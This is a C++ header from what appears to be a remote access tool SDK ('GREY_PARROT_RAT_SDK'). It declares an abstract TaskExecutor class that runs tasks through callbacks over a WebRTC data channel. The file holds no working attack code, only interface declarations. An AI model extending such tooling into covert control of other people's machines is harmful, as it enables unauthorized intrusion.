//
// Created by alsah on 10.05.23.
//

#ifndef GREY_PARROT_RAT_SDK_TASK_EXECUTOR_H
#define GREY_PARROT_RAT_SDK_TASK_EXECUTOR_H

#include <utility>
#include <functional>
#include "rtc/datachannel.hpp"

#include "Task.h"
#include "ModuleInfo.h"

class TaskExecutor{

public:
    virtual void execute(Task task) = 0;

    [[nodiscard]] ModuleInfo getModuleInfo() const;

    explicit TaskExecutor(ModuleInfo aModuleInfo);
    TaskExecutor( ModuleInfo aModuleInfo, const std::function<void(Task)>& callback);

    void setCallback(const std::function<void(Task)> &aCallback);

    virtual void closeDataChanel();
    void setDataChannel(const std::shared_ptr<rtc::DataChannel> &dataChannel);

protected:


    virtual void setDataChannelHandlers() = 0;

    const ModuleInfo moduleInfo;
    std::function<void(Task)> callback;
    std::shared_ptr<rtc::DataChannel> dataChannel;
};


#endif //GREY_PARROT_RAT_SDK_TASK_EXECUTOR_H
